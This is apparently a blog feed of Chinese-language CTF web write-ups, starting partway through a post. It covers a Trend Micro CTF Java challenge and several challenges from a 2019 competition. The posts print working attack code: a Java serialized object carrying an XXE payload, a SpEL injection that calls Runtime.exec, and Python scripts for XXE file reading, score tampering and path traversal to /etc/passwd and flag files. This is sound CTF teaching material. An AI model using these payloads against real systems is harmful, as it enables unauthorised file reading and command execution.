class="keyword">package</span> com.trendmicro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.Node;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.NodeList;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.SAXException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.ParserConfigurationException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Serializable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">559038737L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream aInputStream)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ClassNotFoundException, IOException, ParserConfigurationException, SAXException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> paramInt = aInputStream.readInt();</span><br><span class="line">        <span class="keyword">byte</span>[] arrayOfByte = <span class="keyword">new</span> <span class="keyword">byte</span>[paramInt];</span><br><span class="line">        aInputStream.read(arrayOfByte);</span><br><span class="line">        ByteArrayInputStream localByteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(arrayOfByte);</span><br><span class="line">        DocumentBuilderFactory localDocumentBuilderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">        localDocumentBuilderFactory.setNamespaceAware(<span class="keyword">true</span>);</span><br><span class="line">        DocumentBuilder localDocumentBuilder = localDocumentBuilderFactory.newDocumentBuilder();</span><br><span class="line">        Document localDocument = localDocumentBuilder.parse(localByteArrayInputStream);</span><br><span class="line">        NodeList nodeList = localDocument.getElementsByTagName(<span class="string">"tag"</span>);</span><br><span class="line">        Node node = nodeList.item(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = node.getTextContent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span> <span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException, ParserConfigurationException, SAXException</span>&#123;</span><br><span class="line">        String xml = <span class="string">"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;  \n"</span> +</span><br><span class="line">                <span class="string">"&lt;!DOCTYPE ANY [  \n"</span> +</span><br><span class="line">                <span class="string">"&lt;!ENTITY shit SYSTEM \"file:///TMCTF2019/key\"&gt;   \n"</span> +</span><br><span class="line">                <span class="string">"]&gt;  \n"</span> +</span><br><span class="line">                <span class="string">"&lt;root&gt;&lt;tag&gt;&amp;shit;&lt;/tag&gt;&lt;/root&gt; "</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] bs = xml.getBytes();</span><br><span class="line">        out.writeInt(bs.length);</span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream(bs.length);</span><br><span class="line">        baos.write(bs);</span><br><span class="line">        out.write(baos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.trendmicro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            Person person = <span class="keyword">new</span> Person(<span class="string">"a"</span>);</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./obj"</span>));</span><br><span class="line">            oos.writeObject(person);</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先运行生成exp文件，然后利用python将其作为data发送，尝试进行XXE攻击读取文件/TMCTF2019/key：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://flagmarshal.xyz/jail'</span></span><br><span class="line">f = open(<span class="string">'./obj'</span>,<span class="string">'rb'</span>)</span><br><span class="line">exp = f.read()</span><br><span class="line">r = requests.post(url = url,data=exp)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>可以成功读到回显：<br><img src="/images/2019-09-27-16-08-27.png" alt=""><br>我们关注到现在的<code>person.name</code>已经变成了我们xxe读取的文件内容，我们成功的获取了<code>/TMCTF2019/key</code>，其值为：<code>Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain</code></p><h2 id="Spel表达式注入攻击"><a href="#Spel表达式注入攻击" class="headerlink" title="Spel表达式注入攻击"></a>Spel表达式注入攻击</h2><p>那么我们回到之前的点，剩下的就是对其进行攻击：<br><img src="/images/2019-09-27-16-14-16.png" alt=""><br>我们关注到并没有实际的回显点，我们首先尝试命令执行：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://flagmarshal.xyz/Office?key=Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain&amp;nametag=%s"</span></span><br><span class="line">exp = <span class="string">'''T(java.lang.Runtime).getRuntime().exec("nslookup a.com")'''</span></span><br><span class="line">now_url = url %exp</span><br><span class="line">r = requests.get(now_url)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>得到回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please remember that I can only resolve the &apos;com.trendmicro.jail.Flag&apos; classI am sorry but you cannot see the Marshal</span><br></pre></td></tr></table></figure></p><p>我们发现只允许我们使用：<code>com.trendmicro.jail.Flag</code><br>我们进行代码审计：<br><img src="/images/2019-09-27-16-21-03.png" alt=""><br>我们发现，只要调用getflag()函数即可在报错信息中得到flag。<br>注意到表达式为：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'nametag'</span> == <span class="string">'Marshal'</span></span><br></pre></td></tr></table></figure></p><p>我们的可控点在nametag，我们尝试构造：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nametag = <span class="string">'+T(com.trendmicro.jail.Flag).getFlag()+'</span></span><br></pre></td></tr></table></figure></p><p>这样即可得到：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>+T(com.trendmicro.jail.Flag).getFlag()+<span class="string">''</span> == <span class="string">'Marshal'</span></span><br></pre></td></tr></table></figure></p><p>我们尝试利用：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://flagmarshal.xyz/Office?key=Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain&amp;nametag=%s"</span></span><br><span class="line">exp =<span class="string">"""'+T(com.trendmicro.jail.Flag).getFlag()+'"""</span></span><br><span class="line">now_url = url %exp</span><br><span class="line">r = requests.get(now_url)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p>发现出现了报错，其中并无flag：<br><img src="/images/2019-09-27-16-29-07.png" alt=""><br>纠结了许久，发现是<code>+</code>需要编码为<code>%2B</code>的问题，更正后即可getflag:<br><img src="/images/2019-09-27-16-30-01.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>题目串联了2个漏洞：Spel表达式注入+XXE文件任意读取，放在Java中还是可以学到一些知识的~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前写的文章都是偏重于php，本篇文章就以2019 Trend Micro CTF的一道300分的Java Web开始我的Java之路吧~&lt;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019网络与信息安全领域专项赛Web Writeup</title>
    <link href="http://skysec.top/2019/08/15/2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9BWeb%20Writeup/"/>
    <id>http://skysec.top/2019/08/15/2019网络与信息安全领域专项赛Web Writeup/</id>
    <published>2019-08-15T10:50:10.000Z</published>
    <updated>2019-09-27T06:06:01.476Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天要坐5个小时的高铁，在车上顺便打了个比赛，以下是web题解。</p><h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><p><img src="/images/2019-08-15-16-46-50.png" alt=""><br>拿到题发现是个老虎机= =，本能的查看JS：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4c7add9a08cb4acda1bec9c7693bf7d121100f86cdf74096.changame.ichunqiu.com/js/cqg.js</span><br></pre></td></tr></table></figure></p><p>发现：<br><img src="/images/2019-08-15-16-47-34.png" alt=""><br>随机直接给score.php发包：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://4c7add9a08cb4acda1bec9c7693bf7d121100f86cdf74096.changame.ichunqiu.com/score.php'</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'score'</span>:<span class="string">'15'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-15-16-49-27.png" alt=""></p><h2 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who_are_you?"></a>who_are_you?</h2><p>打开题目发现是个姓名输入，测试了一下发现不是啥注入登录= =：<br><img src="/images/2019-08-15-16-50-19.png" alt=""><br>随即查看了一下源代码：<br><img src="/images/2019-08-15-16-51-05.png" alt=""><br>发现存在xml语句，那么抓包尝试进行XXE文件读取：<br><img src="/images/2019-08-15-16-52-17.png" alt=""><br>发现是有回显的XXE，那么简单构造，探测过滤：<br><img src="/images/2019-08-15-16-56-10.png" alt=""><br>直接尝试任意文件读取：<br><img src="/images/2019-08-15-16-56-31.png" alt=""><br>探测web目录，上字典进行扫描：<br><img src="/images/2019-08-15-16-58-23.png" alt=""><br>直接发现了web目录，随即进行读取：<br><img src="/images/2019-08-15-16-59-25.png" alt=""><br>解码后发现得到flag：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = @file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="comment">//$flag='flag&#123;718a9c72-3d56-4ea9-9a14-d9db51228f61&#125;';</span></span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  = $dom-&gt;textContent;</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;</span><br><span class="line">        <span class="keyword">die</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;718a9c72-3d56-4ea9-9a14-d9db51228f61&#125;</span><br></pre></td></tr></table></figure></p><h2 id="show-me-your-image"><a href="#show-me-your-image" class="headerlink" title="show_me_your_image"></a>show_me_your_image</h2><p>拿到题目后，发现是一个上传界面：<br><img src="/images/2019-08-15-17-02-49.png" alt=""><br>上传图片后得到路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8ee9e71577b74be2a9678e5411e4b1b76b9c259063c54091.changame.ichunqiu.com/img.php?name=TYrg73eHzZhRjmPg</span><br></pre></td></tr></table></figure></p><p>同时session为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJmaWxlIjp7IiBiIjoiVkZseVp6Y3paVWg2V21oU2FtMVFadz09In19.XVWOtA.QVC_HI-oJpjQCJ1v1UaxzUEd2BA</span><br></pre></td></tr></table></figure></p><p>解码得到：<br><img src="/images/2019-08-15-17-08-16.png" alt=""><br>题目有2个地方感觉比较奇怪，第一个地方是文件名比较奇怪，并不是普通的base64，第二个是session比较奇怪，像JWT又不是，观察题目的路由，是发给upload.php的，这是个PHP，却又有不符合php样子的东西，这一点为接下来的内容埋下了伏笔。<br>首先针对文件名进行研究，不难发现，文件名受上传文件的filename影响，同时并不是正常的base64。<br>同时如果想更改文件名进行任意文件读取，会返回500：<br><img src="/images/2019-08-15-17-07-50.png" alt=""><br>经过研究发现，码表是被更换过的：</p><p>我们搞出码表的映射关系：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">ax=<span class="string">'YWFhYmJiY2NjZGRkZWVlZmZmZ2dnaGhoaWlpampqa2trbGxsbW1tbm5ub29vcHBwcXFxcnJyc3NzdHR0dXV1dnZ2d3d3eHh4eXl5enp6QUFBQkJCQ0NDRERERUVFRkZGR0dHSEhISUlJSkpKS0tLTExMTU1NTk5OT09PUFBQUVFRUlJSU1NTVFRUVVVVVlZWV1dXWFhYWVlZWlpaMDAwMTExMjIyMzMzNDQ0NTU1NjY2Nzc3ODg4OTk58+/7f'</span></span><br><span class="line">bx=<span class="string">'0YNf0XCx0ODkMmW9MYPVMXMXMOSgTmfvTYVsTXsRTOFcAmHuAYrFAXh+AOn8jodpjLNHjgC4jUDBSoW1SLPrSgMOSUSU6ofb6LVh6gsKqJNdq9C3q1DyWiWiWJPNW9MmW1SoZif7ZJVCZ9szZ1Fa5iHl5JrD59hw51n2JNdqJPNWJVCZJrD5PNWJPPPPPVMYPrSLYNf0YPVMYVsTly/pl5iHlk74lBlBDyq1D5JrDk0ODBjUwyebw59htQEGI'</span></span><br><span class="line"></span><br><span class="line">c = string.maketrans(ax,bx)</span><br><span class="line">print(string.translate(<span class="string">"index.php"</span>, c))</span><br></pre></td></tr></table></figure></p><p>此时编码就正常了许多，我们可以进行任意文件读取了：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://8ee9e71577b74be2a9678e5411e4b1b76b9c259063c54091.changame.ichunqiu.com/img.php?name='</span></span><br><span class="line">ax=<span class="string">'YWFhYmJiY2NjZGRkZWVlZmZmZ2dnaGhoaWlpampqa2trbGxsbW1tbm5ub29vcHBwcXFxcnJyc3NzdHR0dXV1dnZ2d3d3eHh4eXl5enp6QUFBQkJCQ0NDRERERUVFRkZGR0dHSEhISUlJSkpKS0tLTExMTU1NTk5OT09PUFBQUVFRUlJSU1NTVFRUVVVVVlZWV1dXWFhYWVlZWlpaMDAwMTExMjIyMzMzNDQ0NTU1NjY2Nzc3ODg4OTk58+/7f'</span></span><br><span class="line">bx=<span class="string">'0YNf0XCx0ODkMmW9MYPVMXMXMOSgTmfvTYVsTXsRTOFcAmHuAYrFAXh+AOn8jodpjLNHjgC4jUDBSoW1SLPrSgMOSUSU6ofb6LVh6gsKqJNdq9C3q1DyWiWiWJPNW9MmW1SoZif7ZJVCZ9szZ1Fa5iHl5JrD59hw51n2JNdqJPNWJVCZJrD5PNWJPPPPPVMYPrSLYNf0YPVMYVsTly/pl5iHlk74lBlBDyq1D5JrDk0ODBjUwyebw59htQEGI'</span></span><br><span class="line"></span><br><span class="line">c = string.maketrans(ax,bx)</span><br><span class="line">name = string.translate(base64.b64encode(<span class="string">"../../../etc/passwd"</span>), c)</span><br><span class="line">url = url+name</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"><span class="keyword">print</span> url</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-08-15-17-13-18.png" alt=""><br>此时对/proc目录进行读取探测，发现stat正常：<br><img src="/images/2019-08-15-17-14-13.png" alt=""><br>此时奇怪的事情发生了，看到了一个python3，明明是php的程序，为什么会有python3？<br>于是我对cmdline进行了读取：<br><img src="/images/2019-08-15-17-20-29.png" alt=""><br>发现还真有一个app.py被启动了，那么我赶紧对其源码进行读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../proc/self/cwd/app.py</span><br></pre></td></tr></table></figure></p><p>（这里要注意url编码）<br>即可拿到app.py:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> r_encode, r_decode, read_file</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, request</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">'/tmp/uploads/'</span></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>&#125;</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="meta">@app.route('/index.php')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    file = session.get(<span class="string">'file'</span>)</span><br><span class="line">    <span class="keyword">if</span> file:</span><br><span class="line">        file = bytes.decode(file)</span><br><span class="line">        file = parse.quote(file)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, file=file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload.php', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(app.config[<span class="string">'UPLOAD_FOLDER'</span>]):</span><br><span class="line">                os.makedirs(app.config[<span class="string">'UPLOAD_FOLDER'</span>])</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"不允许的格式"</span></span><br><span class="line">    session[<span class="string">'file'</span>] = r_encode(b64encode(str.encode(file.filename)))</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/img.php', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img</span><span class="params">()</span>:</span></span><br><span class="line">    file = request.args.get(<span class="string">"name"</span>)</span><br><span class="line">    file = r_decode(str.encode(file))</span><br><span class="line">    file = b64decode(file)</span><br><span class="line">    file = UPLOAD_FOLDER + bytes.decode(file)</span><br><span class="line">    image = read_file(file)</span><br><span class="line">    <span class="keyword">return</span> Response(image, mimetype=<span class="string">"ima/jpeg"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        host = <span class="string">'0.0.0.0'</span>,</span><br><span class="line">        port = <span class="number">80</span>,</span><br><span class="line">     )</span><br></pre></td></tr></table></figure></p><p>不禁感叹出题人的阴线，把一个python题目搞成php的样子，叫这种名字的路由= =。<br>接着寻找flag文件，看到出题人的提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">templates/upload.html</span><br></pre></td></tr></table></figure></p><p>于是读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../proc/self/cwd/templates/upload.html</span><br></pre></td></tr></table></figure></p><p>得到:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">"upload.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;</span><br><span class="line">                上传图片</span><br><span class="line">            &lt;<span class="regexp">/td&gt;</span></span><br><span class="line"><span class="regexp">            &lt;td&gt;</span></span><br><span class="line"><span class="regexp">                &lt;input type="file" name="file"&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">            &lt;/</span>td&gt;</span><br><span class="line">        &lt;<span class="regexp">/tr&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>table&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> value=<span class="string">"上传"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&#123;% if file %&#125;</span></span><br><span class="line"><span class="regexp">    &lt;img src="img.php?name=&#123;&#123; file &#125;&#125;"&gt;</span></span><br><span class="line"><span class="regexp">&#123;% else %&#125;</span></span><br><span class="line"><span class="regexp">    请上传一张图片</span></span><br><span class="line"><span class="regexp">&#123;% endif %&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br><span class="line"><span class="regexp">&lt;!-- flag in /</span>root/flag.txt ! Get it ! --&gt;</span><br></pre></td></tr></table></figure></p><p>发下flag在/root/flag.txt，进行读取：<br><img src="/images/2019-08-15-17-26-21.png" alt=""><br>即可成功getflag。</p>]]></content>
    
    <summary type="html">
    
      
      
